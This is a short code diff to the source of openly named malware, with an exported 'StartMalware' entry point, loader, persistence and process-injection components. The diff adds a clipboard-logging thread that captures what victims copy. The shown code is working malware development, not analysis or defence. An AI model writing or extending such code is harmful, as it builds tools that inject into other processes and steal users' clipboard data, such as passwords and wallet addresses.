@@ -4,6 +4,7 @@
 #include "loader.h"
 #include "persistence.h"
 #include "dynamic_library.h"
+#include "ClipboardLogger.h"
 #include "utils.h"
 
 HINSTANCE hdll = NULL;
@@ -53,6 +54,10 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
     Log("log.txt", "[+] loader: create inject thread.\n");
     std::thread threadInjectTargets(RepeatInjectTargets);
     threadInjectTargets.join();
+
+    Log("log.txt", "[+] loader: create clip board listener thread.\n");
+    std::thread ClipBoardListener(ClipboardLogger);
+    ClipBoardListener.join();
 }
 
 std::vector<DWORD> injected_pids;
